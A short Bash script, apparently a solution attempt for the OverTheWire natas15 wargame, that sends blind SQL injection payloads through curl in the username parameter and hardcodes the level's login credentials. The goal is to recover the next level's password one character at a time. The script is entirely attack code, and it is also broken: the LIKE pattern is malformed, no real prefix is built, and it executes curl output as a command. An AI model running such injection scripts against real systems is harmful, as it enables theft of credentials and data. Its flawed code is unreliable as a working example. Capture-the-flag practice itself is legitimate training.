#!/bin/bash

u='natas15'
p='AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'



for x in {a..z}
do
	url="http://natas15.natas.labs.overthewire.org/index.php?debug&username=natas16%22%20and%20password%20like%20%27%w$x%%27%22"
	command=`curl $url -u $u:$p `
	echo "evaulating this url: $url" 
	if [[ $($command | grep -o "This user exists") == "This user exists" ]] 
then
	echo "I was here"
	pass=$pass$x
fi

done

echo $pass

#u='natas15'
#p='AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'



# curl $url -u $u:$p
